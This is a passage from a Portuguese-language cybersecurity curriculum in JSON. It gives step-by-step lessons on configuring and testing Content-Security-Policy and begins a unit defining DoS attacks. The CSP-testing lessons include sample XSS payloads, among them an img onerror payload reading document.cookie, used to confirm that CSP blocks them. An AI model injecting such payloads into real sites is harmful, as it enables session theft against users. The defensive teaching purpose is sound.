                                "Conexão clara entre teoria e exemplos reais."
                              ],
                              "crossCurricularConnections": [
                                "Programação Web: Integração com HTML/JS e headers HTTP.",
                                "Redes e Protocolos: Cabeçalhos HTTP e segurança em camadas OSI.",
                                "Desenvolvimento de Software: Práticas de DevSecOps e CI/CD com CSP.",
                                "Ética e Lei: Conformidade com regulamentações como GDPR via prevenção de breaches."
                              ],
                              "realWorldApplication": "Empresas como Google e Facebook usam CSP restritivo em seus sites para bloquear XSS reflected/DOM-based, reduzindo incidentes de segurança em milhões de visitas diárias; desenvolvedores implementam em apps web para compliance OWASP Top 10."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.4.3.2",
                            "name": "Implementar CSP em servidores web",
                            "description": "Configurar header Content-Security-Policy em Apache/Nginx ou frameworks como Express.js, definindo nonces e hashes para scripts inline, e monitorando violações via report-uri.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender CSP e Planejar a Política",
                                  "subSteps": [
                                    "Estude as diretivas principais do CSP (default-src, script-src, style-src, etc.).",
                                    "Analise o código do site para identificar fontes de scripts, estilos e outros recursos.",
                                    "Defina uma política inicial restritiva usando 'report-only' mode para testes.",
                                    "Gere nonces ou hashes para scripts inline usando ferramentas como crypto.subtle.",
                                    "Documente a política planejada com todas as diretivas necessárias."
                                  ],
                                  "verification": "Crie um documento com a política CSP planejada e valide-a usando CSP evaluator online.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação MDN CSP",
                                    "CSP Evaluator tool (csp-evaluator.withgoogle.com)",
                                    "Código fonte do site de teste"
                                  ],
                                  "tips": "Comece com uma política ampla em report-only para evitar quebras no site.",
                                  "learningObjective": "Compreender componentes do CSP e criar uma política personalizada para um site.",
                                  "commonMistakes": [
                                    "Ignorar recursos de terceiros como Google Analytics",
                                    "Esquecer de incluir 'unsafe-inline' inicialmente para migração gradual",
                                    "Não testar em report-only mode"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar CSP em Apache",
                                  "subSteps": [
                                    "Edite o arquivo de configuração do virtual host (ex: /etc/apache2/sites-available/000-default.conf).",
                                    "Adicione o header: Header always set Content-Security-Policy \"default-src 'self'; script-src 'self' 'nonce-random'; report-uri /csp-report\".",
                                    "Gere um nonce dinâmico usando mod_headers e variáveis de ambiente.",
                                    "Reinicie o Apache: sudo systemctl restart apache2.",
                                    "Teste o header com curl -I http://localhost."
                                  ],
                                  "verification": "Use browser dev tools ou curl para confirmar que o header CSP está presente nas respostas HTTP.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Servidor Apache instalado",
                                    "Editor de texto (nano/vim)",
                                    "Ferramenta curl"
                                  ],
                                  "tips": "Use 'Header always' para garantir aplicação em todos os status codes.",
                                  "learningObjective": "Implementar header CSP corretamente em configuração Apache.",
                                  "commonMistakes": [
                                    "Esquecer de recarregar Apache após edições",
                                    "Usar aspas simples incorretamente nas diretivas",
                                    "Não especificar 'always' no Header"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar CSP em Nginx",
                                  "subSteps": [
                                    "Edite o arquivo de configuração do site (ex: /etc/nginx/sites-available/default).",
                                    "Adicione na seção server: add_header Content-Security-Policy \"default-src 'self'; script-src 'self' 'nonce-random'; report-uri /csp-report\" always;",
                                    "Configure geração de nonce usando lua-resty ou variável $request_id.",
                                    "Teste a configuração: nginx -t, então sudo systemctl reload nginx.",
                                    "Verifique com curl -I http://localhost."
                                  ],
                                  "verification": "Confirme presença do header CSP via dev tools ou curl nas respostas do servidor.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Servidor Nginx instalado",
                                    "Editor de texto",
                                    "Ferramenta curl"
                                  ],
                                  "tips": "Use 'always' no add_header para consistência em erros HTTP.",
                                  "learningObjective": "Aplicar CSP via configuração Nginx de forma funcional.",
                                  "commonMistakes": [
                                    "Não usar 'always' flag",
                                    "Sintaxe incorreta no add_header",
                                    "Falhar no nginx -t antes de reload"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar CSP em Express.js",
                                  "subSteps": [
                                    "Instale helmet: npm install helmet.",
                                    "No app.js: const helmet = require('helmet'); app.use(helmet.contentSecurityPolicy({ directives: { defaultSrc: [\"'self'\"], scriptSrc: [\"'self'\", \"'nonce-#{nonce}'\"], reportUri: '/csp-report' } }));",
                                    "Gere nonce dinâmico: const crypto = require('crypto'); const nonce = crypto.randomBytes(16).toString('base64'); res.locals.nonce = nonce;",
                                    "Passe nonce para templates: res.render('index', { nonce: nonce });",
                                    "Inicie o servidor e teste com curl ou browser."
                                  ],
                                  "verification": "Inspecione headers HTTP no browser para ver CSP com nonce dinâmico.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Node.js e npm instalados",
                                    "Projeto Express.js básico",
                                    "Helmet package"
                                  ],
                                  "tips": "Use helmet para simplificar e evitar erros comuns de sintaxe CSP.",
                                  "learningObjective": "Integrar CSP em aplicações Node.js/Express com nonces dinâmicos.",
                                  "commonMistakes": [
                                    "Não passar nonce para views/templates",
                                    "Usar nonce estático em produção",
                                    "Conflitos com outros middlewares helmet"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Implementar Nonces/Hashes e Monitoramento de Violações",
                                  "subSteps": [
                                    "Calcule hash SHA256 para scripts inline: echo -n 'script content' | openssl dgst -sha256 -binary | openssl base64.",
                                    "Adicione à diretiva: script-src 'self' 'sha256-hashValue' 'nonce-randomValue';",
                                    "Configure endpoint /csp-report no servidor para receber reports (POST JSON).",
                                    "Teste violações abrindo console dev tools e executando script não autorizado.",
                                    "Analise logs de reports para refinar a política."
                                  ],
                                  "verification": "Gere uma violação intencional e confirme que report-uri recebe o log.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "OpenSSL para hashes",
                                    "Endpoint logger no servidor",
                                    "Browser dev tools"
                                  ],
                                  "tips": "Use report-to em vez de report-uri para CSP Level 3 moderno.",
                                  "learningObjective": "Gerenciar exceções seguras com nonces/hashes e monitorar efetividade CSP.",
                                  "commonMistakes": [
                                    "Hashes incorretos devido a quebras de linha",
                                    "Não codificar base64 corretamente",
                                    "Ignorar reports de violações"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um blog WordPress hospedado em Apache, configure CSP permitindo script-src 'self' https://trusted.cdn.com 'nonce-%s'; gere nonce dinâmico no PHP, aplique no header, adicione hashes para analytics inline e monitore violações via endpoint /csp-violation-report-endpoint para prevenir XSS.",
                              "finalVerifications": [
                                "Headers CSP presentes e corretos em todas as páginas via curl ou dev tools.",
                                "Scripts inline só executam com nonce/hash válido; violações bloqueadas.",
                                "Report-uri recebe e loga violações de teste.",
                                "Site funcional sem quebras inesperadas após aplicação.",
                                "Política validada no CSP Evaluator sem erros críticos.",
                                "Testes em múltiplos browsers (Chrome, Firefox) confirmam consistência."
                              ],
                              "assessmentCriteria": [
                                "Política CSP cobre todos recursos identificados sem excessos desnecessários.",
                                "Implementação correta em pelo menos dois ambientes (ex: Apache e Express).",
                                "Nonces/hashes aplicados corretamente a scripts inline.",
                                "Monitoramento de violações funcional com endpoint ativo.",
                                "Documentação completa de configuração e testes.",
                                "Resolução de pelo menos uma violação simulada."
                              ],
                              "crossCurricularConnections": [
                                "Programação Web: Integração com HTML/JS para nonces em tags script.",
                                "Redes e Protocolos: Headers HTTP e análise de tráfego com Wireshark.",
                                "Criptografia: Geração de hashes SHA256 e nonces aleatórios.",
                                "DevOps: Configuração de servidores e CI/CD para políticas CSP.",
                                "Análise de Logs: Processamento de reports JSON para debugging."
                              ],
                              "realWorldApplication": "CSP é essencial em sites como bancos online (ex: Nubank) e e-commerces (ex: Amazon) para mitigar XSS, bloqueando injeções maliciosas e protegendo dados de usuários contra roubo em ataques cibernéticos diários."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.4.3.1"
                            ]
                          },
                          {
                            "id": "10.1.4.4.3.3",
                            "name": "Testar e depurar políticas CSP",
                            "description": "Usar ferramentas como browser DevTools e CSP Evaluator para validar políticas, simular ataques XSS bloqueados e ajustar para evitar falsos positivos em aplicações reais.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente de teste para políticas CSP",
                                  "subSteps": [
                                    "Crie ou utilize uma aplicação web simples com uma política CSP básica implementada via meta tag ou header HTTP.",
                                    "Instale e configure ferramentas essenciais: abra o Chrome DevTools (F12), acesse a aba Network e Console.",
                                    "Registre-se no site CSP Evaluator (csp-evaluator.withgoogle.com) e prepare um payload de teste básico.",
                                    "Configure um servidor local (ex: Live Server no VS Code) para simular um ambiente de produção.",
                                    "Adicione logs no console da aplicação para rastrear violações CSP."
                                  ],
                                  "verification": "Confirme que a aplicação carrega sem erros CSP no console e que o CSP Evaluator reconhece a política.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Navegador Chrome/Firefox",
                                    "Editor de código (VS Code)",
                                    "Servidor local (Live Server ou Node.js)",
                                    "Acesso ao CSP Evaluator online"
                                  ],
                                  "tips": "Use 'unsafe-inline' temporariamente para setup inicial, mas remova depois para testes reais.",
                                  "learningObjective": "Entender e preparar um ambiente isolado para testes de CSP sem interferências externas.",
                                  "commonMistakes": [
                                    "Esquecer de recarregar a página após adicionar CSP",
                                    "Usar HTTPS local sem certificado válido",
                                    "Ignorar cache do navegador"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Validar a política CSP usando ferramentas de diagnóstico",
                                  "subSteps": [
                                    "Cole a política CSP no CSP Evaluator e analise o relatório de violações potenciais (ex: missing nonce, unsafe directives).",
                                    "No DevTools, inspecione headers HTTP na aba Network para confirmar que CSP está sendo enviado corretamente.",
                                    "Use a aba Console para simular violações leves, como injetar um script inline, e observe bloqueios.",
                                    "Gere um relatório de conformidade comparando com OWASP CSP Cheat Sheet.",
                                    "Documente scores do CSP Evaluator (ex: A+, B-) e identifique melhorias prioritárias."
                                  ],
                                  "verification": "CSP Evaluator retorna score acima de B e nenhum erro crítico no console do DevTools.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "CSP Evaluator (online)",
                                    "DevTools do navegador",
                                    "OWASP CSP Cheat Sheet (PDF ou site)"
                                  ],
                                  "tips": "Sempre teste em modo incógnito para evitar extensões interferindo nos resultados.",
                                  "learningObjective": "Dominar ferramentas para avaliação estática e dinâmica de políticas CSP.",
                                  "commonMistakes": [
                                    "Interpretar falsamente 'warnings' como erros bloqueantes",
                                    "Não testar múltiplos endpoints da app",
                                    "Ignorar directivas como frame-ancestors"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Simular ataques XSS e verificar bloqueios CSP",
                                  "subSteps": [
                                    "Prepare payloads XSS comuns (ex: <script>alert(1)</script>, eval(atob('YWxlcnQoMQ=='))).",
                                    "Injete payloads via parâmetros URL, forms ou DOM manipulation e monitore o console para bloqueios CSP.",
                                    "Use Burp Suite ou Postman para simular requests maliciosos com headers customizados.",
                                    "Teste bypasses conhecidos (ex: JSONP, base64 data URIs) e confirme se CSP os bloqueia.",
                                    "Registre screenshots e logs de cada teste bem-sucedido de bloqueio."
                                  ],
                                  "verification": "Todos os 5+ payloads XSS são bloqueados sem execução, visível no console como 'Refused to execute inline script'.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Payloads XSS (XSStrike ou PayloadsAllTheThings)",
                                    "Burp Suite Community (opcional)",
                                    "Postman para API tests"
                                  ],
                                  "tips": "Comece com payloads simples para construir confiança antes de avançar para obfuscados.",
                                  "learningObjective": "Aplicar CSP na detecção e prevenção prática de ataques XSS em cenários simulados.",
                                  "commonMistakes": [
                                    "Não limpar payloads entre testes",
                                    "Confundir bloqueios CSP com outros erros do navegador",
                                    "Testar apenas em localhost sem CORS"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Depurar e ajustar políticas CSP para evitar falsos positivos",
                                  "subSteps": [
                                    "Identifique falsos positivos no console (ex: scripts legítimos de CDNs bloqueados).",
                                    "Ajuste directivas adicionando fontes confiáveis (ex: 'script-src 'self' https://trusted.cdn.com').",
                                    "Re-teste com funcionalidades reais da app (ex: login, analytics) e valide no CSP Evaluator.",
                                    "Implemente nonces ou hashes para scripts inline dinâmicos e teste repetidamente.",
                                    "Versione a política CSP (ex: CSP-Report-Only primeiro) e crie um relatório final de mudanças."
                                  ],
                                  "verification": "Aplicação funciona 100% sem violações CSP e score CSP Evaluator melhorado em pelo menos 1 nível.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Editor de código",
                                    "CSP Evaluator",
                                    "Documentação MDN CSP"
                                  ],
                                  "tips": "Use report-uri/report-to para coletar violações em produção simulada antes de enforçar.",
                                  "learningObjective": "Otimizar CSP equilibrando segurança e usabilidade, eliminando falsos positivos.",
                                  "commonMistakes": [
                                    "Tornar CSP muito permissiva com 'unsafe-eval'",
                                    "Não testar em múltiplos browsers",
                                    "Esquecer de atualizar headers em todos os endpoints"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um e-commerce web, implemente CSP para bloquear XSS em formulários de pagamento. Use DevTools para validar bloqueio de um payload '<img src=x onerror=alert(document.cookie)>' injetado via parâmetro de busca, ajuste para permitir imagens de CDN legítimo sem falsos positivos, e confirme com CSP Evaluator score A.",
                              "finalVerifications": [
                                "Nenhum erro CSP no console após testes completos.",
                                "CSP Evaluator score A ou superior.",
                                "Todos payloads XSS simulados são bloqueados.",
                                "Funcionalidades legítimas (ex: scripts de terceiros) executam sem bloqueios.",
                                "Relatório documentado com logs e screenshots.",
                                "Política ajustada equilibra segurança e performance."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de violações CSP (90%+).",
                                "Uso correto de DevTools e CSP Evaluator.",
                                "Eficácia em simular e bloquear XSS (todos payloads).",
                                "Capacidade de depurar falsos positivos sem comprometer segurança.",
                                "Documentação clara de steps e ajustes.",
                                "Tempo de conclusão dentro do estimado total (2 horas)."
                              ],
                              "crossCurricularConnections": [
                                "Desenvolvimento Web (HTML/JS para simulações).",
                                "Análise de Vulnerabilidades (OWASP Top 10 - XSS).",
                                "Redes e Sistemas (Headers HTTP, servidores locais).",
                                "Ética em Cibersegurança (Testes éticos de penetração).",
                                "Gestão de Projetos (Versionamento de políticas de segurança)."
                              ],
                              "realWorldApplication": "Em equipes de DevSecOps, desenvolvedores usam essa skill para auditar e endurecer CSP em apps como bancos online ou SaaS, prevenindo breaches XSS que afetam milhões de usuários, como no caso do Twitter 2010 ou Magento exploits."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.4.3.2"
                            ]
                          },
                          {
                            "id": "10.1.4.4.3.4",
                            "name": "Integrar CSP com outras defesas",
                            "description": "Combinar CSP com sanitização e tokens CSRF em um pipeline de segurança web, analisando cenários OWASP Top 10 e medindo eficácia via testes automatizados.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar Fundamentos e Configurar Componentes Individuais",
                                  "subSteps": [
                                    "Estude CSP, sanitização de entrada e tokens CSRF, revisando OWASP Top 10 (A3: Injection, A7: XSS, A8: CSRF).",
                                    "Configure CSP básico em um servidor web (ex: Express.js) com políticas como script-src 'self'.",
                                    "Implemente sanitização de entrada usando bibliotecas como validator.js ou DOMPurify.",
                                    "Gere e valide tokens CSRF com csurf ou express-csrf.",
                                    "Teste cada componente isoladamente com payloads maliciosos simples."
                                  ],
                                  "verification": "Execute testes manuais: injete XSS/CSRF e confirme bloqueio individual sem falhas.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Node.js/Express app de exemplo",
                                    "Documentação OWASP Top 10",
                                    "Bibliotecas: helmet.csp, validator.js, csurf"
                                  ],
                                  "tips": "Use nonces em CSP para scripts dinâmicos e valide tokens em todos os POSTs.",
                                  "learningObjective": "Compreender como cada defesa mitiga riscos específicos do OWASP Top 10.",
                                  "commonMistakes": [
                                    "Configurar CSP muito restritivo quebrando funcionalidades legítimas",
                                    "Esquecer sanitização em campos ocultos",
                                    "Não sincronizar clocks para tokens CSRF"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Projetar e Implementar Pipeline de Segurança Integrado",
                                  "subSteps": [
                                    "Defina ordem do pipeline: middleware CSRF -> sanitização -> CSP headers.",
                                    "Integre middlewares em Express: app.use(csrf()), app.use(sanitizer), app.use(helmet.contentSecurityPolicy()).",
                                    "Adapte CSP para permitir apenas domínios confiáveis e report-only mode inicialmente.",
                                    "Crie rotas de exemplo (login, upload) que usem o pipeline completo.",
                                    "Documente o fluxo com diagrama (use Draw.io)."
                                  ],
                                  "verification": "Inspecione headers HTTP com DevTools e confirme presença/ordem correta no pipeline.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Código boilerplate Express",
                                    "Ferramentas: Postman para testes de API",
                                    "Draw.io para diagramas"
                                  ],
                                  "tips": "Use CSP report-uri para logging de violações e monitore logs.",
                                  "learningObjective": "Construir um pipeline layered defense-in-depth para segurança web.",
                                  "commonMistakes": [
                                    "Ordem incorreta de middlewares causando bypass",
                                    "CSP não cobrindo estilos/imagens levando a bypass visual",
                                    "Tokens CSRF reutilizáveis"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Cenários OWASP Top 10 com a Integração",
                                  "subSteps": [
                                    "Mapeie OWASP A3/A7/A8 para o pipeline: simule stored/reflected XSS, CSRF em formulários.",
                                    "Use ferramentas como Burp Suite ou OWASP ZAP para fuzzing automatizado.",
                                    "Registre payloads que falham/ passem e analise por quê (ex: CSP bloqueia eval(), sanitização remove tags).",
                                    "Teste edge cases: JSON payloads, AJAX requests, third-party scripts.",
                                    "Compare eficácia pré/pós-integração com relatórios de vulnerabilidades."
                                  ],
                                  "verification": "Gere relatório mostrando 100% bloqueio de payloads OWASP simulados.",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "OWASP ZAP ou Burp Suite Community",
                                    "Payloads OWASP Cheat Sheet",
                                    "App de teste vulnerável como DVWA"
                                  ],
                                  "tips": "Comece com report-only CSP para evitar quebras durante testes.",
                                  "learningObjective": "Avaliar como a combinação mitiga vetores OWASP reais.",
                                  "commonMistakes": [
                                    "Ignorar reflected DOM XSS bypassando CSP",
                                    "Testes só em localhost ignorando CORS",
                                    "Falta de cobertura para GraphQL endpoints"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Medir Eficácia com Testes Automatizados e Otimizar",
                                  "subSteps": [
                                    "Configure testes com Jest/Supertest + security-chajs para validar headers/pipeline.",
                                    "Integre scans automatizados com npm audit, Snyk ou OWASP Dependency-Check.",
                                    "Meça métricas: taxa de bloqueio, tempo de resposta, false positives.",
                                    "Otimize baseado em resultados: ajuste CSP, adicione WAF rules se necessário.",
                                    "Crie CI/CD pipeline com GitHub Actions para rodar testes de segurança."
                                  ],
                                  "verification": "CI/CD passa com coverage >90% e zero vulnerabilidades críticas.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Jest, Supertest, security-cha-js",
                                    "GitHub Actions YAML",
                                    "Snyk CLI"
                                  ],
                                  "tips": "Use thresholds em métricas: <5% false positives aceitável.",
                                  "learningObjective": "Quantificar impacto da defesa integrada via automação.",
                                  "commonMistakes": [
                                    "Testes só unitários sem end-to-end",
                                    "Métricas enviesadas por payloads fracos",
                                    "CI sem secrets scanning"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma aplicação Node.js/Express de e-commerce, integre CSP (script-src 'self' https://trusted.cdn), sanitização em campos de produto/user-input, e CSRF tokens em formulários de checkout. Teste com ZAP simulando XSS via busca de produto e CSRF no pagamento, confirmando bloqueio total sem impacto na UX.",
                              "finalVerifications": [
                                "CSP headers presentes e corretos em todas respostas HTTP.",
                                "Sanitização remove tags/scripts de inputs sem perda de dados válidos.",
                                "Tokens CSRF válidos bloqueiam requests sem token ou replay.",
                                "Testes OWASP ZAP mostram zero vulnerabilidades A3/A7/A8.",
                                "Testes automatizados passam com coverage 95%+.",
                                "Relatórios de violação CSP vazios ou com false positives mínimos."
                              ],
                              "assessmentCriteria": [
                                "Pipeline integrado sem bypasses em cenários OWASP Top 10.",
                                "Eficácia medida >95% bloqueio com <2% false positives.",
                                "Implementação idempotente e escalável para produção.",
                                "Documentação completa com diagramas e métricas.",
                                "Testes automatizados reproduzíveis e integrados em CI.",
                                "Otimização baseada em evidências de testes reais."
                              ],
                              "crossCurricularConnections": [
                                "Desenvolvimento Web (implementação middlewares Express/React).",
                                "Análise de Riscos (mapeamento OWASP e threat modeling).",
                                "DevSecOps (CI/CD com scans de segurança).",
                                "Testes de Software (unit/integration/security testing).",
                                "Redes e Sistemas (headers HTTP, CORS, WAF)."
                              ],
                              "realWorldApplication": "Em bancos online como Nubank ou e-commerces como Amazon, essa integração previne breaches milionárias por XSS/CSRF, como o incidente Twitter 2010, garantindo conformidade PCI-DSS/GDPR via defesas proativas e auditáveis."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.4.3.3"
                            ]
                          }
                        ]
                      }
                    ]
                  }
                ]
              },
              {
                "id": "10.1.5",
                "name": "Ataques de Negação de Serviço Distribuído",
                "description": "Estuda ataques DDoS e suas implicações.",
                "totalSkills": 48,
                "atomicTopics": [
                  {
                    "id": "10.1.5.1",
                    "name": "Definição de Ataques de Negação de Serviço (DoS) e DDoS",
                    "description": "Conceitos básicos de DoS e distinção para ataques distribuídos (DDoS), incluindo sobrecarga de recursos.",
                    "individualConcepts": [
                      {
                        "id": "10.1.5.1.1",
                        "name": "Ataque de Negação de Serviço (DoS)",
                        "description": "Conceito fundamental de um ataque cibernético no qual um atacante envia um grande volume de tráfego ou solicitações para um alvo, com o objetivo de esgotar seus recursos computacionais, tornando o serviço indisponível para usuários legítimos.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.1.1.1",
                            "name": "Definir Ataque DoS",
                            "description": "Explicar com precisão o que é um ataque de Negação de Serviço (DoS), incluindo seus objetivos principais como interrupção de serviços e distinção de outros tipos de ataques cibernéticos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Conceito Fundamental de Ataque DoS",
                                  "subSteps": [
                                    "Pesquise definições oficiais de DoS em fontes confiáveis como NIST ou OWASP.",
                                    "Identifique a tradução literal: Denial of Service (Negação de Serviço).",
                                    "Anote a essência: sobrecarga de recursos para tornar um serviço indisponível.",
                                    "Registre exemplos iniciais de serviços afetados, como websites ou servidores.",
                                    "Compare com indisponibilidade normal (ex: falha de hardware)."
                                  ],
                                  "verification": "Escreva uma definição de DoS em suas próprias palavras com pelo menos 50 palavras.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Acesso à internet",
                                    "Documentos NIST SP 800-53",
                                    "Site OWASP.org"
                                  ],
                                  "tips": "Use termos precisos como 'flooding' e evite confundir com roubo de dados.",
                                  "learningObjective": "Dominar a definição básica e o propósito principal do DoS.",
                                  "commonMistakes": [
                                    "Confundir DoS com hacking para roubo de informações.",
                                    "Ignorar que DoS visa indisponibilidade, não dano permanente."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Objetivos Principais e Impactos do DoS",
                                  "subSteps": [
                                    "Liste objetivos: interrupção de serviços, sobrecarga de CPU/memória/banda.",
                                    "Analise impactos: perda financeira, dano à reputação, interrupção crítica (ex: hospitais).",
                                    "Classifique tipos: volume-based (UDP flood), protocol-based (SYN flood), app-layer.",
                                    "Quantifique: meça em pacotes/segundo ou requisições/segundo.",
                                    "Discuta motivações: ativismo, extorsão, competição desleal."
                                  ],
                                  "verification": "Crie uma tabela com 3 objetivos principais e 2 impactos associados.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Folha de papel ou Google Docs",
                                    "Vídeos explicativos no YouTube (canais como NetworkChuck)"
                                  ],
                                  "tips": "Foco em 'disponibilidade' do triad CIA (Confidencialidade, Integridade, Disponibilidade).",
                                  "learningObjective": "Explicar como DoS compromete a disponibilidade de sistemas.",
                                  "commonMistakes": [
                                    "Achar que DoS sempre causa dano físico.",
                                    "Subestimar impactos indiretos como perda de confiança."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Mecanismos Comuns de Execução de DoS",
                                  "subSteps": [
                                    "Estude floods comuns: ICMP, UDP, SYN.",
                                    "Entenda o papel do handshake TCP no SYN flood.",
                                    "Simule conceitualmente: envie pacotes falsos para esgotar recursos.",
                                    "Identifique vetores: botnets para escala, amplificação DNS.",
                                    "Registre defesas iniciais: rate limiting, blackholing."
                                  ],
                                  "verification": "Desenhe um diagrama simples de um SYN flood com atacante, vítima e handshake incompleto.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Ferramenta de desenho como Draw.io",
                                    "Artigo Krebs on Security sobre floods"
                                  ],
                                  "tips": "Visualize fluxos de rede para melhor compreensão.",
                                  "learningObjective": "Descrever tecnicamente como um DoS opera em nível de rede.",
                                  "commonMistakes": [
                                    "Confundir mecanismo com ferramenta específica (ex: LOIC).",
                                    "Ignorar limitações de um DoS single-source."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Diferenciar DoS de Outros Ataques Cibernéticos",
                                  "subSteps": [
                                    "Compare com DDoS: single vs múltiplas fontes.",
                                    "Distinga de ransomware (criptografia vs sobrecarga).",
                                    "Separe de phishing (engenharia social vs técnico).",
                                    "Contraste com exploits zero-day (vulnerabilidade vs volume).",
                                    "Crie matriz comparativa com 4 ataques comuns."
                                  ],
                                  "verification": "Responda a 5 perguntas de distinção em um quiz autoavaliado.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Planilha Excel ou Google Sheets",
                                    "Glossário de cibersegurança (SANS Institute)"
                                  ],
                                  "tips": "Use mnemônicos: DoS = 'Down', DDoS = 'Distributed Down'.",
                                  "learningObjective": "Posicionar DoS no espectro de ameaças cibernéticas.",
                                  "commonMistakes": [
                                    "Equiparar DoS a DDoS sem notar escala.",
                                    "Misturar com ataques de integridade como SQL injection."
                                  ]
                                }
                              ],
                              "practicalExample": "Em 2016, o site Dyn DNS sofreu um DoS massivo via botnet Mirai, usando dispositivos IoT infectados para floodar tráfego UDP, derrubando serviços como Twitter e Netflix para usuários nos EUA por horas, demonstrando interrupção em escala real.",
                              "finalVerifications": [
                                "Defina DoS em uma frase precisa.",
                                "Liste 3 objetivos principais sem erros.",
                                "Explique diferença chave entre DoS e DDoS.",
                                "Identifique 2 mecanismos comuns de DoS.",
                                "Descreva um impacto real em um setor crítico.",
                                "Crie diagrama de um flood SYN."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição (sem omissões chave).",
                                "Clareza na distinção de outros ataques.",
                                "Profundidade nos objetivos e impactos.",
                                "Uso correto de terminologia técnica.",
                                "Capacidade de exemplos concretos.",
                                "Completude da matriz comparativa."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos TCP/IP e floods.",
                                "Ética e Direito: Legalidade de testes de DoS e leis como CFAA.",
                                "Matemática: Cálculo de throughput e limites de banda.",
                                "Gestão de Projetos: Planejamento de resiliência em TI.",
                                "Psicologia: Motivações humanas em ciberataques."
                              ],
                              "realWorldApplication": "Analistas de SOC usam definições precisas de DoS para configurar alertas em ferramentas como Splunk ou Wireshark, detectando floods precocemente e mitigando interrupções em infraestruturas críticas como bancos ou governos."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.1.1.2",
                            "name": "Identificar Objetivos de um Ataque DoS",
                            "description": "Reconhecer os alvos comuns de ataques DoS, como servidores web, roteadores ou aplicações, e descrever como a indisponibilidade afeta negócios e usuários.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos Fundamentais de Alvos em Ataques DoS",
                                  "subSteps": [
                                    "Defina o que é um ataque DoS e seu objetivo principal: tornar um recurso indisponível.",
                                    "Explique o conceito de 'alvo' como qualquer sistema ou serviço acessível via rede que pode ser sobrecarregado.",
                                    "Identifique os tipos de recursos visados: hardware (servidores, roteadores) e software (aplicações web).",
                                    "Discuta por que alvos são escolhidos com base em visibilidade e criticidade.",
                                    "Revise exemplos iniciais de alvos não-DoS para diferenciar contextos."
                                  ],
                                  "verification": "Liste e defina pelo menos 3 conceitos chave relacionados a alvos em DoS.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Acesso à internet",
                                    "Documentação sobre DoS (ex: OWASP, NIST)"
                                  ],
                                  "tips": "Use diagramas de rede para visualizar alvos potenciais.",
                                  "learningObjective": "Entender os fundamentos teóricos de alvos em ataques DoS.",
                                  "commonMistakes": [
                                    "Confundir alvos de DoS com alvos de invasão de dados",
                                    "Ignorar alvos de infraestrutura de rede"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Alvos Comuns de Ataques DoS",
                                  "subSteps": [
                                    "Liste servidores web (ex: Apache, Nginx) como alvos primários devido ao tráfego alto.",
                                    "Descreva roteadores e firewalls como alvos para bloquear tráfego de rede inteira.",
                                    "Analise aplicações web e APIs como alvos por sobrecarga de requisições.",
                                    "Inclua serviços DNS e de autenticação (ex: LDAP) que causam efeitos em cascata.",
                                    "Classifique alvos por criticidade: alto (infraestrutura) vs. médio (aplicações específicas)."
                                  ],
